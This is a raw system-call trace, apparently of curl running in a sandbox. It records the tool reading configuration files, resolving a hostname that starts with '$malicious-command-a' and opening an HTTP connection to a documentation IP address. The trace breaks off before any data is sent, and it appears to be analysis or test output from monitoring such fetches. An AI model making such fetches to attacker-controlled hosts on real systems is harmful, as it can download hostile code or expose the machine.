22    10:07:55.705500 arch_prctl(ARCH_SET_FS, 0x7c3d3a0d8940) = 0
22    10:07:55.705872 set_tid_address(0x7c3d3a0d8c10) = 22
22    10:07:55.706248 set_robust_list(0x7c3d3a0d8c20, 24) = 0
22    10:07:55.706628 rseq(0x7c3d3a0d9260, 0x20, 0, 0x53053053) = 0
22    10:07:55.707105 mprotect(0x7c3d3b30e000, 16384, PROT_READ) = 0
22    10:07:55.707504 mprotect(0x7c3d3a0e7000, 4096, PROT_READ) = 0
22    10:07:55.708075 mprotect(0x7c3d3a0f9000, 4096, PROT_READ) = 0
22    10:07:55.708637 mprotect(0x7c3d3a102000, 4096, PROT_READ) = 0
22    10:07:55.709087 mprotect(0x7c3d3a118000, 4096, PROT_READ) = 0
22    10:07:55.709829 mprotect(0x7c3d3a2a3000, 53248, PROT_READ) = 0
22    10:07:55.710238 mprotect(0x7c3d3a2df000, 4096, PROT_READ) = 0
22    10:07:55.711071 mprotect(0x7c3d3af10000, 376832, PROT_READ) = 0
22    10:07:55.711625 mprotect(0x7c3d3a2fb000, 4096, PROT_READ) = 0
22    10:07:55.712127 mprotect(0x7c3d3a308000, 4096, PROT_READ) = 0
22    10:07:55.712539 mprotect(0x7c3d3a30e000, 4096, PROT_READ) = 0
22    10:07:55.712950 mprotect(0x7c3d3a33a000, 4096, PROT_READ) = 0
22    10:07:55.713465 mprotect(0x7c3d3a3f6000, 53248, PROT_READ) = 0
22    10:07:55.713876 mprotect(0x7c3d3a489000, 4096, PROT_READ) = 0
22    10:07:55.714312 mprotect(0x7c3d3a4dd000, 8192, PROT_READ) = 0
22    10:07:55.714757 mprotect(0x7c3d3a525000, 8192, PROT_READ) = 0
22    10:07:55.715264 mprotect(0x7c3d3a8cb000, 16384, PROT_READ) = 0
22    10:07:55.715677 mprotect(0x7c3d3b0e0000, 4096, PROT_READ) = 0
22    10:07:55.716648 mprotect(0x7c3d3a70e000, 65536, PROT_READ) = 0
22    10:07:55.717329 mprotect(0x7c3d3a8de000, 4096, PROT_READ) = 0
22    10:07:55.717817 mprotect(0x7c3d3a998000, 4096, PROT_READ) = 0
22    10:07:55.718306 mprotect(0x7c3d3a9a8000, 4096, PROT_READ) = 0
22    10:07:55.718845 mprotect(0x7c3d3aa03000, 8192, PROT_READ) = 0
22    10:07:55.719336 mprotect(0x7c3d3aa58000, 8192, PROT_READ) = 0
22    10:07:55.720114 mprotect(0x7c3d3b00e000, 40960, PROT_READ) = 0
22    10:07:55.720621 mprotect(0x7c3d3b02e000, 4096, PROT_READ) = 0
22    10:07:55.721080 mprotect(0x7c3d3b33b000, 4096, PROT_READ) = 0
22    10:07:55.721646 mprotect(0x7c3d3b09e000, 8192, PROT_READ) = 0
22    10:07:55.722203 mprotect(0x7c3d3b0be000, 4096, PROT_READ) = 0
22    10:07:55.722721 mprotect(0x7c3d3b10b000, 12288, PROT_READ) = 0
22    10:07:55.723379 mprotect(0x7c3d3b3f7000, 16384, PROT_READ) = 0
22    10:07:55.723792 mprotect(0x7c3d3b403000, 4096, PROT_READ) = 0
22    10:07:55.724383 mprotect(0x5bc845ba6000, 20480, PROT_READ) = 0
22    10:07:55.724911 mprotect(0x7c3d3b43d000, 8192, PROT_READ) = 0
22    10:07:55.725397 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
22    10:07:55.725960 munmap(0x7c3d3b3fe000, 7295) = 0
22    10:07:55.726452 getrandom("\x36\xdb\x73\x58\x7f\xc6\xf3\x9f", 8, GRND_NONBLOCK) = 8
22    10:07:55.726871 brk(NULL)         = 0x5bc86ac2d000
22    10:07:55.727253 brk(0x5bc86ac4e000) = 0x5bc86ac4e000
22    10:07:55.728092 getrandom("\x67", 1, GRND_NONBLOCK) = 1
22    10:07:55.728639 newfstatat(AT_FDCWD</sandbox>, "/etc/gnutls/config", {st_mode=S_IFREG|0644, st_size=119, ...}, 0) = 0
22    10:07:55.729145 openat(AT_FDCWD</sandbox>, "/etc/gnutls/config", O_RDONLY|O_CLOEXEC) = 3</etc/gnutls/config>
22    10:07:55.729602 fstat(3</etc/gnutls/config>, {st_mode=S_IFREG|0644, st_size=119, ...}) = 0
22    10:07:55.730030 brk(0x5bc86ac6f000) = 0x5bc86ac6f000
22    10:07:55.730446 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
22    10:07:55.730898 read(3</etc/gnutls/config>, "", 4096) = 0
22    10:07:55.731336 lseek(3</etc/gnutls/config>, 0, SEEK_SET) = 0
22    10:07:55.731753 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
22    10:07:55.732524 read(3</etc/gnutls/config>, "", 4096) = 0
22    10:07:55.736062 close(3</etc/gnutls/config>) = 0
22    10:07:55.744671 brk(0x5bc86ac6e000) = 0x5bc86ac6e000
22    10:07:55.747340 fcntl(0<pipe:[79132]>, F_GETFD) = 0
22    10:07:55.748682 fcntl(1<pipe:[78065]>, F_GETFD) = 0
22    10:07:55.749855 fcntl(2<pipe:[78066]>, F_GETFD) = 0
22    10:07:55.751087 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
22    10:07:55.752094 futex(0x7c3d3af6f3ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.752824 futex(0x7c3d3af6f3e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.753576 futex(0x7c3d3af6f3d8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.754334 futex(0x7c3d3af6f4e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.755069 futex(0x7c3d3af6f3c8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.755730 futex(0x7c3d3af6f3c0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.756294 openat(AT_FDCWD</sandbox>, "/proc/sys/crypto/fips_enabled", O_RDONLY) = -1 ENOENT (No such file or directory)
22    10:07:55.756905 futex(0x7c3d3af6f0ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.757501 futex(0x7c3d3af6ef08, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.758113 futex(0x7c3d3af6ee44, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.758592 futex(0x7c3d3af6f424, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.759029 futex(0x7c3d3af6ee38, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.759764 futex(0x7c3d3af6f3d0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.760728 openat(AT_FDCWD</sandbox>, "/usr/lib/ssl/openssl.cnf", O_RDONLY) = 3</etc/ssl/openssl.cnf>
22    10:07:55.768413 fstat(3</etc/ssl/openssl.cnf>, {st_mode=S_IFREG|0644, st_size=12324, ...}) = 0
22    10:07:55.771061 read(3</etc/ssl/openssl.cnf>, "#\n# OpenSSL example configuratio"..., 4096) = 4096
22    10:07:55.773086 read(3</etc/ssl/openssl.cnf>, "d attributes must be the same, a"..., 4096) = 4096
22    10:07:55.774594 read(3</etc/ssl/openssl.cnf>, "coding of an extension: beware e"..., 4096) = 4096
22    10:07:55.775883 read(3</etc/ssl/openssl.cnf>, " = $insta::certout # insta.cert."..., 4096) = 36
22    10:07:55.777080 read(3</etc/ssl/openssl.cnf>, "", 4096) = 0
22    10:07:55.778049 close(3</etc/ssl/openssl.cnf>) = 0
22    10:07:55.779063 futex(0x7c3d3af6ebf8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.779768 futex(0x7c3d3af6ec54, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.780412 futex(0x7c3d3af6f394, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.780941 futex(0x7c3d3af6ebd8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.781505 futex(0x7c3d3af6f3b8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.782012 futex(0x7c3d3b01b844, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.782526 futex(0x7c3d3b01b864, FUTEX_WAKE_PRIVATE, 2147483647) = 0
22    10:07:55.783283 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
22    10:07:55.783979 openat(AT_FDCWD</sandbox>, "/home/analyst/.config/curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
22    10:07:55.784523 geteuid()         = 1001
22    10:07:55.784999 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[77475]>
22    10:07:55.785559 connect(3<socket:[77475]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
22    10:07:55.786086 close(3<socket:[77475]>) = 0
22    10:07:55.786602 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[77476]>
22    10:07:55.787017 connect(3<socket:[77476]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
22    10:07:55.787439 close(3<socket:[77476]>) = 0
22    10:07:55.787866 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
22    10:07:55.788339 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
22    10:07:55.788778 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
22    10:07:55.789209 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
22    10:07:55.789619 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
22    10:07:55.790049 read(3</etc/nsswitch.conf>, "", 4096) = 0
22    10:07:55.790476 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
22    10:07:55.790890 close(3</etc/nsswitch.conf>) = 0
22    10:07:55.791315 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
22    10:07:55.791752 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
22    10:07:55.792241 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
22    10:07:55.792706 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
22    10:07:55.793322 close(3</etc/passwd>) = 0
22    10:07:55.793787 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
22    10:07:55.794372 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.794835 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.795300 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.795768 ioctl(1<pipe:[78065]>, TCGETS, 0x7ffdfe05a180) = -1 ENOTTY (Inappropriate ioctl for device)
22    10:07:55.796315 ioctl(0<pipe:[79132]>, TIOCGWINSZ, 0x7ffdfe05a2b0) = -1 ENOTTY (Inappropriate ioctl for device)
22    10:07:55.796934 pipe2([3<pipe:[77477]>, 4<pipe:[77477]>], 0) = 0
22    10:07:55.797453 fcntl(3<pipe:[77477]>, F_GETFL) = 0 (flags O_RDONLY)
22    10:07:55.797879 fcntl(3<pipe:[77477]>, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
22    10:07:55.798292 fcntl(4<pipe:[77477]>, F_GETFL) = 0x1 (flags O_WRONLY)
22    10:07:55.798712 fcntl(4<pipe:[77477]>, F_SETFL, O_WRONLY|O_NONBLOCK) = 0
22    10:07:55.799131 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.799739 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.800231 poll([{fd=3<pipe:[77477]>, events=POLLIN}], 1, 0) = 0 (Timeout)
22    10:07:55.800652 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.801079 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.801589 brk(0x5bc86aca3000) = 0x5bc86aca3000
22    10:07:55.802364 socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 5<socket:[77478]>
22    10:07:55.803037 close(5<socket:[77478]>) = 0
22    10:07:55.803500 pipe2([5<pipe:[77479]>, 6<pipe:[77479]>], 0) = 0
22    10:07:55.803949 rt_sigaction(SIGRT_1, {sa_handler=0x7c3d3b1a8610, sa_mask=[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_RESTART|SA_SIGINFO, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.804378 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
22    10:07:55.804799 mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7c3d398d7000
22    10:07:55.805222 mprotect(0x7c3d398d8000, 8388608, PROT_READ|PROT_WRITE) = 0
22    10:07:55.805648 rt_sigprocmask(SIG_BLOCK, ~[], [], 8) = 0
22    10:07:55.806069 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7c3d3a0d7990, parent_tid=0x7c3d3a0d7990, exit_signal=0, stack=0x7c3d398d7000, stack_size=0x7ffd80, tls=0x7c3d3a0d76c0}, 88) = -1 ENOSYS (Function not implemented)
22    10:07:55.806526 clone(child_stack=0x7c3d3a0d6d70, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tid=[23], tls=0x7c3d3a0d76c0, child_tidptr=0x7c3d3a0d7990) = 23
23    10:07:55.807245 rseq(0x7c3d3a0d7fe0, 0x20, 0, 0x53053053 <unfinished ...>
22    10:07:55.807469 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
23    10:07:55.807739 <... rseq resumed>) = 0
22    10:07:55.807952 <... rt_sigprocmask resumed>NULL, 8) = 0
23    10:07:55.808200 set_robust_list(0x7c3d3a0d79a0, 24 <unfinished ...>
22    10:07:55.808427 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.808631 <... set_robust_list resumed>) = 0
22    10:07:55.808857 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.809055 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
22    10:07:55.809287 poll([{fd=5<pipe:[77479]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 1 <unfinished ...>
23    10:07:55.809579 <... rt_sigprocmask resumed>NULL, 8) = 0
23    10:07:55.809970 mmap(NULL, 134217728, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d318d7000
23    10:07:55.810546 munmap(0x7c3d318d7000, 41062400 <unfinished ...>
22    10:07:55.810769 <... poll resumed>) = 0 (Timeout)
23    10:07:55.811043 <... munmap resumed>) = 0
22    10:07:55.811278 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    10:07:55.811511 munmap(0x7c3d38000000, 26046464 <unfinished ...>
22    10:07:55.811718 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
23    10:07:55.811953 <... munmap resumed>) = 0
22    10:07:55.812183 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.812449 mprotect(0x7c3d34000000, 135168, PROT_READ|PROT_WRITE <unfinished ...>
22    10:07:55.812664 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.812889 <... mprotect resumed>) = 0
22    10:07:55.813096 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.813353 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0 <unfinished ...>
22    10:07:55.813555 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.813762 <... socket resumed>) = 7<socket:[83216]>
22    10:07:55.813965 poll([{fd=5<pipe:[77479]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 2 <unfinished ...>
23    10:07:55.814152 connect(7<socket:[83216]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
23    10:07:55.814609 close(7<socket:[83216]>) = 0
23    10:07:55.815025 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7<socket:[83217]>
23    10:07:55.815438 connect(7<socket:[83217]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
23    10:07:55.815882 close(7<socket:[83217]>) = 0
22    10:07:55.816425 <... poll resumed>) = 0 (Timeout)
23    10:07:55.816627 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf",  <unfinished ...>
22    10:07:55.816849 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    10:07:55.817053 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
22    10:07:55.817238 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
23    10:07:55.817422 newfstatat(AT_FDCWD</sandbox>, "/etc/resolv.conf",  <unfinished ...>
22    10:07:55.817598 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.817830 <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=22, ...}, 0) = 0
22    10:07:55.818075 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.818319 openat(AT_FDCWD</sandbox>, "/etc/host.conf", O_RDONLY|O_CLOEXEC <unfinished ...>
22    10:07:55.818573 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.818793 <... openat resumed>) = 7</etc/host.conf>
22    10:07:55.818975 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.819170 fstat(7</etc/host.conf>,  <unfinished ...>
22    10:07:55.819342 poll([{fd=5<pipe:[77479]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 4 <unfinished ...>
23    10:07:55.819535 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=92, ...}) = 0
23    10:07:55.819745 read(7</etc/host.conf>, "# The \"order\" line is only used "..., 4096) = 92
23    10:07:55.820196 read(7</etc/host.conf>, "", 4096) = 0
23    10:07:55.820627 close(7</etc/host.conf>) = 0
23    10:07:55.821054 futex(0x7c3d3b31a66c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
23    10:07:55.821490 openat(AT_FDCWD</sandbox>, "/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 7</etc/resolv.conf>
23    10:07:55.821935 fstat(7</etc/resolv.conf>, {st_mode=S_IFREG|0644, st_size=22, ...}) = 0
23    10:07:55.822372 read(7</etc/resolv.conf>, "nameserver 172.19.0.2\n", 4096) = 22
23    10:07:55.822800 read(7</etc/resolv.conf>, "", 4096) = 0
23    10:07:55.823202 uname({sysname="Linux", nodename="fc1e21eea59f", ...}) = 0
23    10:07:55.823612 fstat(7</etc/resolv.conf>,  <unfinished ...>
22    10:07:55.823799 <... poll resumed>) = 0 (Timeout)
23    10:07:55.823961 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=22, ...}) = 0
22    10:07:55.824188 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    10:07:55.824367 close(7</etc/resolv.conf> <unfinished ...>
22    10:07:55.824545 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
23    10:07:55.824720 <... close resumed>) = 0
22    10:07:55.824884 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.825060 openat(AT_FDCWD</sandbox>, "/etc/hosts", O_RDONLY|O_CLOEXEC <unfinished ...>
22    10:07:55.825233 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.825425 <... openat resumed>) = 7</etc/hosts>
22    10:07:55.825648 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.825923 fstat(7</etc/hosts>,  <unfinished ...>
22    10:07:55.826181 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.826393 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=172, ...}) = 0
22    10:07:55.826569 poll([{fd=5<pipe:[77479]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 8 <unfinished ...>
23    10:07:55.826790 lseek(7</etc/hosts>, 0, SEEK_SET) = 0
23    10:07:55.827320 read(7</etc/hosts>, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 172
23    10:07:55.827758 read(7</etc/hosts>, "", 4096) = 0
23    10:07:55.828197 close(7</etc/hosts>) = 0
23    10:07:55.828858 socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 7<socket:[83218]>
23    10:07:55.829328 setsockopt(7<socket:[83218]>, SOL_IP, IP_RECVERR, [1], 4) = 0
23    10:07:55.829797 connect(7<socket:[83218]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.19.0.2")}, 16) = 0
23    10:07:55.830280 poll([{fd=7<socket:[83218]>, events=POLLOUT}], 1, 0) = 1 ([{fd=7, revents=POLLOUT}])
23    10:07:55.830717 sendmmsg(7<socket:[83218]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\3\23\1\0\0\1\0\0\0\0\0\0$malicious-command-a"..., iov_len=58}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=58}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\236\26\1\0\0\1\0\0\0\0\0\0$malicious-command-a"..., iov_len=58}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=58}], 2, MSG_NOSIGNAL) = 2
23    10:07:55.831338 poll([{fd=7<socket:[83218]>, events=POLLIN}], 1, 5000 <unfinished ...>
22    10:07:55.834971 <... poll resumed>) = 0 (Timeout)
22    10:07:55.835341 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.836039 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.836656 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.837148 poll([{fd=5<pipe:[77479]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 16 <unfinished ...>
23    10:07:55.839937 <... poll resumed>) = 1 ([{fd=7, revents=POLLIN}])
23    10:07:55.840229 ioctl(7<socket:[83218]>, FIONREAD, [74]) = 0
23    10:07:55.840743 recvfrom(7<socket:[83218]>, "\3\23\205\200\0\1\0\1\0\0\0\0$malicious-command-a"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.19.0.2")}, [28 => 16]) = 74
23    10:07:55.841219 poll([{fd=7<socket:[83218]>, events=POLLIN}], 1, 4989) = 1 ([{fd=7, revents=POLLIN}])
23    10:07:55.841654 ioctl(7<socket:[83218]>, FIONREAD, [58]) = 0
23    10:07:55.842211 recvfrom(7<socket:[83218]>, "\236\26\205\200\0\1\0\0\0\0\0\0$malicious-command-a"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.19.0.2")}, [28 => 16]) = 58
23    10:07:55.842775 close(7<socket:[83218]>) = 0
23    10:07:55.843275 write(6<pipe:[77479]>, "\1", 1) = 1
22    10:07:55.843838 <... poll resumed>) = 1 ([{fd=5, revents=POLLIN}])
23    10:07:55.844017 rt_sigprocmask(SIG_BLOCK, ~[RT_1],  <unfinished ...>
22    10:07:55.844263 rt_sigaction(SIGPIPE, NULL,  <unfinished ...>
23    10:07:55.844440 <... rt_sigprocmask resumed>NULL, 8) = 0
22    10:07:55.844608 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
23    10:07:55.844826 madvise(0x7c3d398d7000, 8368128, MADV_DONTNEED <unfinished ...>
22    10:07:55.844997 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330},  <unfinished ...>
23    10:07:55.845173 <... madvise resumed>) = 0
22    10:07:55.845339 <... rt_sigaction resumed>NULL, 8) = 0
23    10:07:55.845505 exit(0 <unfinished ...>
22    10:07:55.845685 futex(0x7c3d3a0d7990, FUTEX_WAIT_BITSET|FUTEX_CLOCK_REALTIME, 23, NULL, FUTEX_BITSET_MATCH_ANY <unfinished ...>
23    10:07:55.846040 <... exit resumed>) = ?
23    10:07:55.846295 +++ exited with 0 +++
22    10:07:55.846523 <... futex resumed>) = 0
22    10:07:55.846793 close(6<pipe:[77479]>) = 0
22    10:07:55.847226 close(5<pipe:[77479]>) = 0
22    10:07:55.847713 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5<socket:[77480]>
22    10:07:55.848203 setsockopt(5<socket:[77480]>, SOL_TCP, TCP_NODELAY, [1], 4) = 0
22    10:07:55.848678 setsockopt(5<socket:[77480]>, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
22    10:07:55.849114 setsockopt(5<socket:[77480]>, SOL_TCP, TCP_KEEPIDLE, [60], 4) = 0
22    10:07:55.849697 setsockopt(5<socket:[77480]>, SOL_TCP, TCP_KEEPINTVL, [60], 4) = 0
22    10:07:55.850246 fcntl(5<socket:[77480]>, F_GETFL) = 0x2 (flags O_RDWR)
22    10:07:55.850840 fcntl(5<socket:[77480]>, F_SETFL, O_RDWR|O_NONBLOCK) = 0
22    10:07:55.851292 connect(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.123")}, 16) = -1 EINPROGRESS (Operation now in progress)
22    10:07:55.851929 getsockname(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(47342), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
22    10:07:55.852403 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.852807 poll([{fd=5<socket:[77480]>, events=POLLOUT}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 0) = 0 (Timeout)
